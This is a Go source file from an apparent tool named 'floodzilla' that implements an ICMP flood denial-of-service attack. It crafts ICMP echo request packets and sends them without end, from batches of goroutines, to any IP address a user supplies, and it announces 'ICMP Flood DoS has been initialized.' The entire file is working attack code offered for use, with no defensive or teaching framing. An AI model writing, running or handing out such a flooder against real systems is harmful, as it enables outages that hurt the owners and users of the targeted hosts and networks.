package services

import (
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"floodzilla/utils"
)

const (
	icmpEchoRequest = 8
)

func createICMPPacket(sequenceNumber int) []byte {
	packet := make([]byte, 8)

	packet[0] = icmpEchoRequest
	packet[1] = 0

	packet[2] = 0
	packet[3] = 0

	packet[4] = 0
	packet[5] = 1
	packet[6] = byte(sequenceNumber >> 8)
	packet[7] = byte(sequenceNumber & 0xff)

	check := utils.Checksum(packet)
	packet[2] = byte(check >> 8)
	packet[3] = byte(check & 0xff)

	return packet
}

func sendICMPFlood(ip string, wg *sync.WaitGroup, verbose *bool, sequenceNumber int) {
	defer wg.Done()

	conn, err := net.Dial("ip4:icmp", ip)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	packet := createICMPPacket(sequenceNumber)
	_, writingErr := conn.Write(packet)
	if writingErr != nil {
		log.Println("Error:", err)
		return
	}

	if *verbose {
		currentTime := time.Now()
		fmt.Printf("[%s] - ICMP Flood - Package sent to %s with sequence: %d\n", currentTime.Format("2006-01-02 15:04:05"), ip, sequenceNumber)
	}

}

func IcmpFlood(ip *string, numRoutines *int, verbose *bool) {

	if net.ParseIP(*ip) == nil {
		fmt.Println("Invalid IP address")
		return
	}

	var wg sync.WaitGroup

	if !*verbose {
		fmt.Println("ICMP Flood DoS has been initialized.")
	}

	sequenceNumber := 0
	for {
		for i := 0; i < *numRoutines; i++ {
			sequenceNumber++
			wg.Add(1)
			go sendICMPFlood(*ip, &wg, verbose, sequenceNumber)
			time.Sleep(10 * time.Millisecond)
		}

		wg.Wait()
	}
}
